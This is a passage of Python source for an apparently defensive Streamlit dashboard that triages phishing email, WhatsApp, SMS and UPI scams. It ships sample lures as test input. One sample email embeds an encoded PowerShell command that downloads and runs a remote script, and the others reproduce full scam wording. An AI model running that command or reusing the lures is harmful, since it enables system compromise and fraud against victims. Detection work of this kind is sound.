import base64
import html
import io
import json
import time
import hashlib
import re
import urllib.parse
import folium
from elevenlabs.client import ElevenLabs
from ingestion_engine import EmailIngestionEngine
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle
import streamlit as st
from streamlit_folium import st_folium
import google.generativeai as genai

st.set_page_config(
    page_title="SYNOVA Autonomous SOC Platform",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# --- SECRETS & API CLIENT INITIALIZATION ---
api_key = st.secrets.get("GEMINI_API_KEY", "")
elevenlabs_api_key = st.secrets.get("ELEVENLABS_API_KEY", "")
abuse_key = st.secrets.get("ABUSEIPDB_API_KEY", "")

eleven_client = ElevenLabs(api_key=elevenlabs_api_key) if elevenlabs_api_key else None

# --- STATE CONTROLLERS ---
if "replay" in st.query_params:
    st.query_params.clear()
    st.session_state.intro_done = False
    st.session_state.last_played_audio_hash = None

if "intro_done" not in st.session_state:
    st.session_state.intro_done = False

if "last_played_audio_hash" not in st.session_state:
    st.session_state.last_played_audio_hash = None

if "copilot_history" not in st.session_state:
    st.session_state.copilot_history = []

# --- BUILT-IN MULTI-CHANNEL SAMPLE THREAT PAYLOADS ---
SAMPLE_QUISHING_APT = b"""Received: from relay1.transparent-relay.top (185.220.101.5) by mx.defense-gateway.in;
Authentication-Results: mx.defense-gateway.in; dkim=none; spf=fail
From: State Bank Security Desk <alerts@onlinesbi-kyc-update.top>
To: defense-officer@nic.in
Subject: [URGENT] Immediate Security Action: Account Verification & KYC Notice
Date: Sat, 05 Sep 2026 14:10:00 +0530

Dear Officer,
Your corporate defense allowance credentials have been flagged for unverified KYC compliance.
Kindly be advised that prompt attention is required. Failure to do so will result in immediate suspension.

Please use your mobile camera to scan QR code in the attached digital slip to re-authorize MFA token:
https://onlinesbi-kyc-update.top/auth-verify-session?token=SEC99201

Execute administrative bypass token:
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAczEiKQ==

State Bank Security Directorate
"""

SAMPLE_HOMOGLYPH_PAYPAL = b"""Received: from mail.harvester-node.net (194.26.29.112) by mx.enterprise.com;
Authentication-Results: mx.enterprise.com; dkim=fail; spf=softfail
From: PayPal Security Department <service@paypa1.com>
To: accounts-team@enterprise.com
Subject: Notice: Suspicious $1,420.00 Transaction Reversed - Confirm Identity
Date: Sat, 05 Sep 2026 11:20:00 +0000

Dear Customer,
We detected an unauthorized billing request of $1,420.00 originating from an unknown IP address.
To immediately cancel this unauthorized invoice and restore your account security, login now:
https://paypa1.com/cgi-bin/webscr-login-verify

If this was not you, password verification is strictly required within 2 hours.
PayPal Risk Mitigation Team
"""

SAMPLE_WHATSAPP_DIGITAL_ARREST = b"""[05/09/26, 14:15:22] +91 98210 44921: ATTENTION: This is Officer Rajesh Verma from Central Bureau of Investigation (CBI) Cyber Crime Cell, New Delhi.
A consignment linked to your Aadhaar card containing contraband narcotics and 24 cloned debit cards has been seized at Mumbai Customs.
A non-bailable warrant and Digital Arrest Order #CBI-ND-2026-9912 have been issued against you under PMLA Section 4.
You are strictly ordered to remain on this encrypted video call link immediately to record your statement before Supreme Court detention:
https://cbi-investigation-portal.nic-gov.top/verify-clearance?case=9912

Failure to connect within 15 minutes will result in immediate police raid at your residential address.
"""

SAMPLE_SMS_ELECTRICITY_APK = b"""Dear Consumer, Your Electricity Power will be disconnected tonight at 9:30 PM from power office because your previous month bill was not updated.
Please immediately download and update your DISCOM Power Bill Verification application to avoid disconnection:
https://bijli-bill-update.online/Mahavitaran_Power_v4.2.apk

Call our Electricity Officer immediately: +91 97182 39102.
"""

SAMPLE_UPI_DEEPLINK_FRAUD = b"""Congratulations! Your OLX buyer has pre-approved payment of Rs 15,000 for your furniture listing.
Click the government-approved UPI gateway link to receive the instant money directly into your account:
upi://pay?pa=olx-clearing-desk@icici&pn=OLX_Fast_Disbursal&am=15000&cu=INR&tn=Receive_Funds_Direct

Do not share your UPI PIN. Click above link to claim.
"""

SAMPLE_CLEAN_CORP = b"""Received: from mail-relay.google.com (209.85.220.41) by mx.google.com;
Authentication-Results: mx.google.com; dkim=pass; spf=pass (google.com: domain designates 209.85.220.41 as permitted sender)
From: IT Operations Desk <it-support@synova-enterprise.internal>
To: team-all@synova-enterprise.internal
Subject: Scheduled Cloud Infrastructure Maintenance Window (Sunday 2:00 AM UTC)
Date: Sat, 05 Sep 2026 09:00:00 +0000

Hi Team,
This is a standard notification regarding the scheduled system firmware upgrade this weekend.
All internal cloud services will remain accessible, with a potential 5-minute latency during routing table failover.
No action is required from employees.

Regards,
IT Infrastructure Operations
"""

# --- STEP 1: INITIAL PROTECTION CALIBRATION SCREEN ---
if not st.session_state.intro_done:
    st.markdown(
        """
        <style>
        .stApp { background-color: #04070d !important; }
        .intro-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            margin-top: 15vh;
            margin-bottom: 25px;
        }
        .intro-shield-svg {
            width: 120px;
            height: 140px;
            fill: none;
            stroke: #00a8ff;
            stroke-width: 1.6;
            stroke-dasharray: 450;
            stroke-dashoffset: 450;
            animation: drawIntroShield 2.2s cubic-bezier(0.65, 0, 0.35, 1) forwards;
            filter: drop-shadow(0 0 20px rgba(0, 168, 255, 0.6));
        }
        @keyframes drawIntroShield {
            0% { stroke-dashoffset: 450; transform: scale(0.9); opacity: 0.3; }
            80% { stroke-dashoffset: 0; transform: scale(1.04); opacity: 1; }
            100% { stroke-dashoffset: 0; transform: scale(1); opacity: 1; }
        }
        .intro-title {
            color: #00a8ff;
            font-family: 'JetBrains Mono', monospace;
            font-size: 20px;
            font-weight: bold;
            letter-spacing: 3.5px;
            margin-top: 22px;
            text-shadow: 0 0 12px rgba(0, 168, 255, 0.6);
        }
        .intro-sub {
            color: #94a3b8;
            font-family: monospace;
            font-size: 13px;
            letter-spacing: 1.5px;
            margin-top: 8px;
        }
        </style>
        <div class="intro-container">
            <svg class="intro-shield-svg" viewBox="0 0 24 28">
                <path d="M12 2 L3 5.5 V13 C3 19.5 7 24.5 12 26 C17 24.5 21 19.5 21 13 V5.5 Z" />
                <path d="M12 4.5 L5 7.2 V13 C5 18 8 22.2 12 23.6 C16 22.2 19 18 19 13 V7.2 Z" stroke-dasharray="2 2" stroke-width="0.8"/>
            </svg>
            <div class="intro-title">INITIALIZING DEFENSE MATRIX...</div>
            <div class="intro-sub">CALIBRATING BLOCKCHAIN MERKLE PROOF & OMNICHANNEL HEURISTICS</div>
        </div>
        """,
        unsafe_allow_html=True,
    )

    col_l, col_btn, col_r = st.columns([1.5, 1, 1.5])
    with col_btn:
        if st.button("⚡ Skip Calibration", use_container_width=True):
            st.session_state.intro_done = True
            st.rerun()

    progress_bar = st.progress(0)
    for percent in range(100):
        time.sleep(0.02)
        progress_bar.progress(percent + 1)

    st.session_state.intro_done = True
    st.rerun()

# --- STEP 2: SETUP CONTAINERS & BASE VARIABLES ---
header_container = st.container()
ingestion_container = st.container()
content_container = st.container()

primary_color = "#00a8ff"
glow_rgba = "rgba(0, 168, 255, 0.16)"
bg_glow = "rgba(0, 168, 255, 0.20)"
badge_text = "OMNICHANNEL RADAR ACTIVE"
score_num = 0
results = None
pulse_duration = "5.0s"
voice_briefing = "Welcome to Synova Omnichannel Threat Intelligence Matrix. Defense engines are online and stand by for multi-vector byte stream."

# --- STEP 3: OMNICHANNEL INGESTION GATEWAY ---
with ingestion_container:
    in_mode = st.radio(
        "Select Threat Ingestion Gateway:",
        [
            "📱 1-Tap Mobile Threat Simulator",
            "💬 WhatsApp / Telegram / SMS Chat Paste",
            "📁 Safe File Upload (.eml / .msg / .txt)",
            "📝 Raw RFC-822 Stream Paste",
            "☁️ Zero-Touch Cloud Mailbox (IMAP)"
        ],
        horizontal=True
    )

    raw_payload_bytes = None
    selected_vector = "EMAIL"

    if "1-Tap" in in_mode:
        st.caption("📲 **Mobile-Friendly Testing:** No .eml download required on mobile. Tap any sample vector below for instant in-memory triage:")
        s_c1, s_c2, s_c3, s_c4, s_c5 = st.columns(5)
        if s_c1.button("🚨 Quishing & APT36 Lure", use_container_width=True):
            raw_payload_bytes = SAMPLE_QUISHING_APT
            selected_vector = "EMAIL"
        if s_c2.button("⚠️ PayPal Homoglyph Spoof", use_container_width=True):
            raw_payload_bytes = SAMPLE_HOMOGLYPH_PAYPAL
            selected_vector = "EMAIL"
        if s_c3.button("🚔 WhatsApp Digital Arrest", use_container_width=True):
            raw_payload_bytes = SAMPLE_WHATSAPP_DIGITAL_ARREST
            selected_vector = "WHATSAPP"
        if s_c4.button("⚡ SMS Electricity Bill APK", use_container_width=True):
            raw_payload_bytes = SAMPLE_SMS_ELECTRICITY_APK
            selected_vector = "SMS"
        if s_c5.button("💳 UPI Deep-Link Exploit", use_container_width=True):
            raw_payload_bytes = SAMPLE_UPI_DEEPLINK_FRAUD
            selected_vector = "UPI_INTENT"

    elif "Chat Paste" in in_mode:
        st.caption("💬 **Paste any suspicious WhatsApp chat snippet, Telegram message, or SMS text directly below:**")
        c_type = st.selectbox("Channel Source:", ["WhatsApp", "Telegram", "SMS / Smishing", "LinkedIn / Social DM"])
        raw_stream_text = st.text_area(
            "Paste chat text / message body here:",
            height=130,
            placeholder="[14:20] +91 98765...: Your electricity bill is unpaid. Download APK to avoid power cut..."
        )
        if st.button("⚡ Triage Message Stream", use_container_width=True):
            if raw_stream_text.strip():
                raw_payload_bytes = raw_stream_text.encode("utf-8")
                selected_vector = c_type.upper().split()[0]

    elif "Upload" in in_mode:
        st.caption("📁 Phone aur Desktop dono par `.eml`, `.msg` aur `.txt` format support karta hai.")
        uploaded_file = st.file_uploader(
            "Drop or select file here",
            type=["eml", "msg", "txt"],
            key="threat_file_input"
        )
        if uploaded_file is not None:
            raw_payload_bytes = uploaded_file.getvalue()
            selected_vector = "EMAIL" if not uploaded_file.name.endswith(".txt") else "SMS"

    elif "Raw RFC-822" in in_mode:
        st.caption("📝 Inspect raw ASCII/MIME streams copy-pasted directly from webmail headers (Zero Disk footprint).")
        raw_stream_text = st.text_area(
            "Paste raw RFC-822 headers & payload here:",
            height=130,
            placeholder="Received: from mail.attacker.net ...\nFrom: attacker@malicious.com ..."
        )
        if st.button("⚡ Triage Raw Buffer", use_container_width=True):
            if raw_stream_text.strip():
                raw_payload_bytes = raw_stream_text.encode("utf-8")
                selected_vector = "EMAIL"

    else:
        st.caption("🔒 **Zero-Download Cloud Protection:** Reads unread email buffers directly in memory via SSL.")
        ci1, ci2, ci3 = st.columns([1.5, 1.5, 1.2])
        with ci1: imap_server = st.text_input("IMAP Server Host", value="imap.gmail.com")
        with ci2: imap_email = st.text_input("User / Service Account", placeholder="incident-sandbox@corp.com")
        with ci3: imap_password = st.text_input("16-Digit App Password", type="password")
        if st.button("🚀 Fetch & Neutralize In-Memory", use_container_width=True):
            if imap_email and imap_password:
                with st.spinner("Connecting to SSL Cloud Mailbox Buffer..."):
                    try:
                        engine = EmailIngestionEngine.from_imap(
                            imap_server, imap_email, imap_password, api_key=api_key, abuse_key=abuse_key
                        )
                        results = engine.parse_email()
                        selected_vector = "EMAIL"
                    except Exception as e:
                        st.error(f"IMAP Handshake Error: {str(e)}")
            else:
                st.warning("Please provide IMAP credentials to read mailbox buffer.")

    if raw_payload_bytes and not results:
        with st.spinner(f"Executing In-Memory Forensics, Merkle Anchoring, Deep OSINT & AI Triage for {selected_vector}..."):
            engine = EmailIngestionEngine(raw_payload_bytes, api_key=api_key, abuse_key=abuse_key, vector_type=selected_vector)
            results = engine.parse_email()

# --- STEP 4: DYNAMIC THREAT STATE EVALUATION ---
if results is not None:
    raw_score = str(results.get("ai_analysis", {}).get("score", "0"))
    try:
        score_num = int("".join([c for c in raw_score.split("/")[0] if c.isdigit()]))
    except Exception:
        score_num = 0

    origin_city = str(results["metadata"]["geo_data"].get("city", "Unknown"))
    origin_country = str(results["metadata"]["geo_data"].get("country", "Unknown"))
    ip_type = str(results["metadata"]["geo_data"].get("ip_type", "Residential ISP"))
    channel_name = results.get("channel", "EMAIL")

    if score_num >= 70:
        primary_color = "#ff3355"
        glow_rgba = "rgba(255, 51, 85, 0.35)"
        bg_glow = "rgba(255, 51, 85, 0.30)"
        badge_text = f"CRITICAL {channel_name} THREAT"
        pulse_duration = "0.65s"
        voice_briefing = f"Alert. High-risk attack vector isolated on {channel_name} channel. Origin anchored at {origin_city}, {origin_country}. Automated counter-strike containment playbooks are active."
    elif score_num >= 40:
        primary_color = "#ffaa00"
        glow_rgba = "rgba(255, 170, 0, 0.25)"
        bg_glow = "rgba(255, 170, 0, 0.22)"
        badge_text = f"SUSPICIOUS {channel_name} VECTOR"
        pulse_duration = "1.6s"
        voice_briefing = f"Caution. Suspicious behavioral heuristics logged on {channel_name} stream. Sender origin anchored at {origin_city}."
    else:
        primary_color = "#00ffcc"
        glow_rgba = "rgba(0, 255, 204, 0.18)"
        bg_glow = "rgba(0, 255, 204, 0.20)"
        badge_text = f"CLEAN {channel_name} STREAM"
        pulse_duration = "4.0s"
        voice_briefing = f"Forensic inspection complete. {channel_name} stream verified clean. Zero threat signatures found."

# --- STEP 5: DYNAMIC CYBER UI & MOBILE RESPONSIVE ENGINE ---
shield_emoji_svg = f"""<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 28' fill='none'><path d='M12 2 L3 5.5 V13 C3 19.5 7 24.5 12 26 C17 24.5 21 19.5 21 13 V5.5 Z' stroke='{primary_color}' stroke-width='1.2' stroke-opacity='0.45' fill='{primary_color}' fill-opacity='0.05'/><path d='M12 4.5 L5 7.2 V13 C5 18 8 22.2 12 23.6 C16 22.2 19 18 19 13 V7.2 Z' stroke='{primary_color}' stroke-width='0.8' stroke-dasharray='1.5 1.5' stroke-opacity='0.35' fill='none'/></svg>""".replace("#", "%23")

st.markdown(
    f"""
    <style>
    .stApp {{
        background-color: #04070d !important;
        background-image: 
            url("data:image/svg+xml,{shield_emoji_svg}"),
            radial-gradient(circle at 50% 0%, {bg_glow} 0%, transparent 65%),
            radial-gradient(circle at 90% 90%, {glow_rgba} 0%, transparent 50%),
            linear-gradient({glow_rgba} 1px, transparent 1px),
            linear-gradient(90deg, {glow_rgba} 1px, transparent 1px) !important;
        background-position: center 48%, center top, right bottom, 0 0, 0 0 !important;
        background-repeat: no-repeat, no-repeat, no-repeat, repeat, repeat !important;
        background-size: 400px 460px, 100% 100%, 100% 100%, 40px 40px, 40px 40px !important;
        animation: threatShieldGlowPulse {pulse_duration} ease-in-out infinite alternate;
    }}

    @keyframes threatShieldGlowPulse {{
        0% {{ filter: drop-shadow(0 0 4px {primary_color}22); opacity: 0.88; }}
        100% {{ filter: drop-shadow(0 0 25px {primary_color}) drop-shadow(0 0 45px {primary_color}66); opacity: 1; }}
    }}

    /* Ultra-Smooth Ambient Laser Scanner */
    .stApp::before {{
        content: ""; position: fixed; top: 0; left: 0; right: 0; height: 2px;
        background: linear-gradient(90deg, transparent 0%, {primary_color}66 25%, {primary_color} 50%, {primary_color}66 75%, transparent 100%);
        box-shadow: 0 0 15px 2px {primary_color}44, 0 0 35px 6px {glow_rgba};
        filter: blur(0.5px); animation: smoothLaserSweep 9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite alternate;
        pointer-events: none; z-index: 1; opacity: 0.45;
    }}

    @keyframes smoothLaserSweep {{
        0% {{ transform: translateY(-5vh); opacity: 0.1; }}
        15% {{ opacity: 0.45; }}
        85% {{ opacity: 0.45; }}
        100% {{ transform: translateY(102vh); opacity: 0.1; }}
    }}

    [data-testid="stAppViewBlockContainer"] {{
        position: relative;
        z-index: 2;
    }}

    .live-badge, .replay-badge {{
        display: inline-flex; align-items: center; justify-content: center; gap: 8px;
        background: {glow_rgba} !important; border: 1px solid {primary_color} !important;
        color: {primary_color} !important; font-size: 11px; padding: 6px 14px;
        border-radius: 20px; font-family: 'Courier New', monospace; font-weight: bold;
        letter-spacing: 1.5px; box-shadow: 0 0 15px {glow_rgba}; text-decoration: none !important;
        cursor: pointer; transition: all 0.25s ease-in-out; white-space: nowrap;
    }}

    .replay-badge:hover {{
        background: {primary_color} !important; color: #04070d !important;
        box-shadow: 0 0 25px {primary_color} !important; transform: translateY(-1px);
    }}

    .pulse-dot {{
        width: 8px; height: 8px; background-color: {primary_color}; border-radius: 50%;
        box-shadow: 0 0 10px {primary_color}; display: inline-block;
        animation: socPulse {pulse_duration} infinite ease-in-out !important;
    }}

    @keyframes socPulse {{
        0%, 100% {{ transform: scale(0.85); opacity: 0.3; box-shadow: 0 0 2px {primary_color}; }}
        50% {{ transform: scale(1.35); opacity: 1; box-shadow: 0 0 16px {primary_color}; }}
    }}

    [data-testid="stFileUploadDropzone"], .stFileUploader section {{
        background: rgba(8, 14, 26, 0.75) !important; backdrop-filter: blur(16px) !important;
        border: 1.5px dashed {primary_color} !important; border-radius: 16px !important;
        box-shadow: 0 0 20px {glow_rgba} !important;
    }}

    [data-testid="stMetric"] {{
        background: rgba(10, 18, 32, 0.75) !important; backdrop-filter: blur(14px) !important;
        border: 1px solid {primary_color} !important; border-radius: 12px !important;
        padding: 10px 14px !important; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6) !important;
    }}
    [data-testid="stMetricValue"] {{
        color: {primary_color} !important; font-family: 'JetBrains Mono', monospace !important;
        font-size: 20px !important; text-shadow: 0 0 12px {primary_color};
    }}

    .soc-terminal {{
        background: rgba(5, 8, 15, 0.95); border: 1px solid {primary_color}; border-left: 4px solid {primary_color};
        border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', 'Courier New', monospace;
        color: #d1d5db; font-size: 13px; line-height: 1.6; box-shadow: 0 0 25px {glow_rgba}; margin-bottom: 20px;
    }}

    .ttp-card {{
        display: inline-block; background: rgba(15, 23, 42, 0.9); border: 1px solid {primary_color};
        border-radius: 8px; padding: 10px 14px; margin: 6px; min-width: 220px;
    }}

    .timeline-item {{
        position: relative; padding-left: 24px; border-left: 2px solid {primary_color}; margin-bottom: 14px;
    }}
    .timeline-dot {{
        position: absolute; left: -6px; top: 2px; width: 10px; height: 10px;
        background: {primary_color}; border-radius: 50%; box-shadow: 0 0 8px {primary_color};
    }}

    .layer-card {{
        background: rgba(10, 18, 32, 0.85); border: 1px solid {primary_color}; border-radius: 8px;
        padding: 12px 16px; margin-bottom: 10px;
    }}
    .layer-title {{
        color: {primary_color}; font-size: 13px; font-weight: bold; font-family: monospace; margin-bottom: 4px; text-transform: uppercase;
    }}

    /* Mobile & Tablet Responsiveness */
    @media only screen and (max-width: 768px) {{
        .stApp {{ background-size: 100% 100%, 100% 100%, 25px 25px, 25px 25px !important; }}
        h1 {{ font-size: 20px !important; }}
        p {{ font-size: 12px !important; }}
        .live-badge, .replay-badge {{ font-size: 9px !important; padding: 4px 8px !important; }}
        [data-testid="stMetricValue"] {{ font-size: 16px !important; }}
        .ttp-card {{ width: 100% !important; min-width: 100% !important; margin: 4px 0 !important; }}
        .soc-terminal {{ font-size: 11px !important; padding: 10px !important; }}
        .stButton>button {{ min-height: 44px !important; font-size: 13px !important; }}
    }}
    </style>
    """,
    unsafe_allow_html=True,
)

# --- STEP 6: RENDER TOP HEADER ---
with header_container:
    col1, col2 = st.columns([3.2, 1.8])
    with col1:
        st.markdown(f"<h1 style='color: white; margin-bottom: 0px;'>🛡️ SYNOVA <span style='color: {primary_color};'>Omnichannel XDR</span></h1>", unsafe_allow_html=True)
        st.markdown("<p style='color: #94a3b8; font-size: 14px; margin-top: 4px;'>Blockchain Merkle Custody, Nation-State Attribution, Deep OSINT, STIX 2.1 & Threat Graph Engine</p>", unsafe_allow_html=True)
    with col2:
        st.markdown(
            f"""
            <div style='display: flex; flex-direction: column; align-items: flex-end; gap: 8px; margin-top: 8px;'>
                <span class='live-badge'><span class='pulse-dot'></span>{badge_text}</span>
                <a href='?replay=1' target='_self' class='replay-badge'>🔁 REPLAY PROTOCOL</a>
            </div>
            """,
            unsafe_allow_html=True,
        )
    st.divider()

# --- STEP 7: DEDICATED SINGLE-DISPATCH AUDIO ENGINE ---
current_audio_hash = hashlib.md5(voice_briefing.encode('utf-8')).hexdigest()

if st.session_state.last_played_audio_hash != current_audio_hash:
    st.session_state.last_played_audio_hash = current_audio_hash
    audio_b64_payload = ""

    if eleven_client:
        try:
            audio_stream = eleven_client.text_to_speech.convert(
                text=voice_briefing,
                voice_id="EXAVITQu4vr4xnSDxMaL",
                model_id="eleven_multilingual_v2"
            )
            audio_bytes = b"".join(list(audio_stream))
            audio_b64_payload = base64.b64encode(audio_bytes).decode("utf-8")
        except Exception:
            audio_b64_payload = ""

    audio_bridge_js = f"""
    <script>
    (function() {{
        const b64Data = "{audio_b64_payload}";
        const textMsg = "{voice_briefing}";
        const audioId = "{current_audio_hash}";

        if (window.parent.__synovaLastAudio === audioId) return;
        window.parent.__synovaLastAudio = audioId;

        if ('speechSynthesis' in window) {{
            window.speechSynthesis.cancel();
        }}
        if (window.parent && window.parent.speechSynthesis) {{
            window.parent.speechSynthesis.cancel();
        }}

        if (b64Data && b64Data.length > 50) {{
            if (window.parent.__currentSynovaAudio) {{
                window.parent.__currentSynovaAudio.pause();
                window.parent.__currentSynovaAudio.currentTime = 0;
            }}
            const audio = new Audio("data:audio/mp3;base64," + b64Data);
            audio.volume = 0.95;
            window.parent.__currentSynovaAudio = audio;
            
            const playPromise = audio.play();
            if (playPromise !== undefined) {{
                playPromise.catch(() => {{
                    const unlock = () => {{
                        audio.play();
                        window.parent.document.removeEventListener('click', unlock);
                    }};
                    window.parent.document.addEventListener('click', unlock, {{ once: true }});
                }});
            }}
        }} else if ('speechSynthesis' in window) {{
            const utter = new SpeechSynthesisUtterance(textMsg);
            utter.rate = 0.95;
            utter.pitch = 1.0;
            window.speechSynthesis.speak(utter);
        }}
    }})();
    </script>
    """
    st.components.v1.html(audio_bridge_js, height=0)

# --- PDF FORENSIC REPORT GENERATOR ---
def build_pdf_buffer(results_data):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter, rightMargin=30, leftMargin=30, topMargin=30, bottomMargin=30)
    story = []
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle("TStyle", parent=styles["Heading1"], fontSize=18, textColor=colors.HexColor("#003366"))
    heading_style = ParagraphStyle("HStyle", parent=styles["Heading2"], fontSize=12, textColor=colors.HexColor("#0055a5"), spaceBefore=10, spaceAfter=6)
    body_style = ParagraphStyle("BStyle", parent=styles["Normal"], fontSize=9, textColor=colors.HexColor("#222222"), leading=12)

    story.append(Paragraph("SYNOVA CYBERSECURITY INCIDENT REPORT", title_style))
    story.append(Paragraph("<b>Autonomous Omnichannel Threat Intelligence, OSINT & SOAR Playbook</b>", body_style))
    story.append(Spacer(1, 10))

    story.append(Paragraph("Incident Envelope & Origin Reconnaissance", heading_style))
    meta = results_data.get("metadata", {})
    chain = results_data.get("blockchain_custody", {})
    apt = results_data.get("apt_attribution", {})
    m_data = [
        [Paragraph("<b>Channel Vector:</b>", body_style), Paragraph(f"<b>{results_data.get('channel', 'EMAIL')}</b>", body_style)],
        [Paragraph("<b>Subject / Headline:</b>", body_style), Paragraph(html.escape(str(meta.get("subject", "N/A"))), body_style)],
        [Paragraph("<b>Sender / Origin ID:</b>", body_style), Paragraph(html.escape(str(meta.get("from", "N/A"))), body_style)],
        [Paragraph("<b>Origin Relay Node:</b>", body_style), Paragraph(html.escape(str(meta.get("sender_ip", "N/A"))), body_style)],
        [Paragraph("<b>Threat Score:</b>", body_style), Paragraph(html.escape(str(results_data.get("ai_analysis", {}).get("score", "N/A"))), body_style)],
        [Paragraph("<b>Attributed Threat Actor:</b>", body_style), Paragraph(f"<b>{apt.get('actor_name')}</b> ({apt.get('confidence_score')}%)", body_style)],
        [Paragraph("<b>Blockchain Merkle Root:</b>", body_style), Paragraph(f"<code>{chain.get('merkle_root', 'N/A')}</code>", body_style)],
        [Paragraph("<b>Legal Admissibility:</b>", body_style), Paragraph(str(chain.get("legal_compliance", "BSA Sec 63/65B Compliant")), body_style)]
    ]
    t = Table(m_data, colWidths=[140, 380])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#f2f4f8")),
        ("BOX", (0, 0), (-1, -1), 1, colors.HexColor("#d0d7de")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("PADDING", (0, 0), (-1, -1), 5),
    ]))
    story.append(t)
    story.append(Spacer(1, 10))

    story.append(Paragraph("AI Forensic Breakdown", heading_style))
    story.append(Paragraph(html.escape(str(results_data.get("ai_analysis", {}).get("analysis", "None"))), body_style))
    story.append(Spacer(1, 10))

    story.append(Paragraph("Recommended Containment & Mitigation Playbook", heading_style))
    mitigations_raw = str(results_data.get("ai_analysis", {}).get("mitigations", "No immediate mitigation required."))
    story.append(Paragraph(html.escape(mitigations_raw).replace("\n", "<br/>"), body_style))
    story.append(Spacer(1, 10))

    story.append(Paragraph("Extracted Indicators of Compromise (IOC URLs & Endpoints)", heading_style))
    urls = results_data.get("body_artifacts", {}).get("extracted_urls", [])
    if urls:
        url_data = [[Paragraph(f"• {html.escape(str(u))}", body_style)] for u in urls[:15]]
        ut = Table(url_data, colWidths=[520])
        ut.setStyle(TableStyle([
            ("BOX", (0, 0), (-1, -1), 1, colors.HexColor("#d0d7de")),
            ("PADDING", (0, 0), (-1, -1), 4),
        ]))
        story.append(ut)
    else:
        story.append(Paragraph("No URLs or deep-link vectors detected.", body_style))

    doc.build(story)
    buffer.seek(0)
    return buffer

# --- STEP 8: RENDER MAIN INVESTIGATION DASHBOARD ---
with content_container:
    if results is None:
        st.markdown(
            f"""
            <div style="background: linear-gradient(135deg, rgba(8, 14, 26, 0.95) 0%, rgba(15, 23, 42, 0.85) 100%); border: 1px solid rgba(0, 168, 255, 0.3); border-left: 5px solid {primary_color}; border-radius: 12px; padding: 24px; margin-top: 10px; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0, 168, 255, 0.1);">
                <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
                    <h3 style="color: #ffffff; margin: 0; font-family: 'JetBrains Mono', monospace; font-size: 20px;">
                        ⚡ WELCOME TO THE SYNOVA OMNICHANNEL DEFENSE MATRIX
                    </h3>
                    <span style="background: rgba(0, 168, 255, 0.15); color: {primary_color}; border: 1px solid {primary_color}; font-size: 11px; padding: 4px 10px; border-radius: 12px; font-weight: bold; font-family: monospace;">
                        BLOCKCHAIN & CYBERSECURITY
                    </span>
                </div>
                <p style="color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 16px;">
                    SYNOVA is an autonomous, zero-disk cybersecurity forensic engine engineered to intercept, deconstruct, and neutralize high-level attack vectors across <b>Email, WhatsApp, SMS Smishing, Telegram, and Social Media DMs</b>. Ingest payloads via 1-tap mobile simulators, safe file drop (.eml/.txt), raw MIME streaming, or direct cloud IMAP mailbox handshake to execute real-time AI triage, deep Shodan/AbuseIPDB reconnaissance, lookalike domain tracking, Quishing optical decoding, and cryptographic blockchain evidence anchoring.
                </p>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <span style="background: rgba(0, 168, 255, 0.1); border: 1px solid rgba(0, 168, 255, 0.3); color: {primary_color}; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">1. OMNICHANNEL VECTOR INGESTION</span>
                    <span style="background: rgba(14, 165, 233, 0.1); border: 1px solid rgba(14, 165, 233, 0.3); color: #38bdf8; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">2. APT THREAT ACTOR ATTRIBUTION</span>
                    <span style="background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.3); color: #c084fc; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">3. BLOCKCHAIN MERKLE PROOF ANCHOR</span>
                    <span style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; font-size: 12px; padding: 6px 12px; border-radius: 6px; font-family: monospace;">4. ACTIVE CANARY COUNTER-STRIKE</span>
                </div>
            </div>
            """, unsafe_allow_html=True,
        )

        c1, c2, c3, c4 = st.columns(4)
        with c1: st.metric(label="VECTOR SCOPE", value="OMNICHANNEL", delta="Email • WhatsApp • SMS")
        with c2: st.metric(label="FINANCIAL DEFENSE", value="UPI DEFANGER", delta="Intent Trap Killer")
        with c3: st.metric(label="THEME MATCH", value="BLOCKCHAIN", delta="BSA Sec 63/65B Proof")
        with c4: st.metric(label="AI COPILOT", value="ACTIVE", delta="Tier-3 Terminal")

    else:
        dash_col1, dash_col2 = st.columns([1.2, 3])

        with dash_col1:
            circumference = 282.74
            stroke_dashoffset = circumference - (score_num / 100.0) * circumference
            st.markdown(
                f"""
                <div style="text-align: center; background: rgba(10, 18, 32, 0.75); border: 1px solid {primary_color}; border-radius: 12px; padding: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.6);">
                    <svg width="150" height="150" viewBox="0 0 120 120">
                        <circle cx="60" cy="60" r="45" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="10"/>
                        <circle cx="60" cy="60" r="45" fill="none" stroke="{primary_color}" stroke-width="10"
                                stroke-dasharray="{circumference}" stroke-dashoffset="{stroke_dashoffset}"
                                stroke-linecap="round" transform="rotate(-90 60 60)"
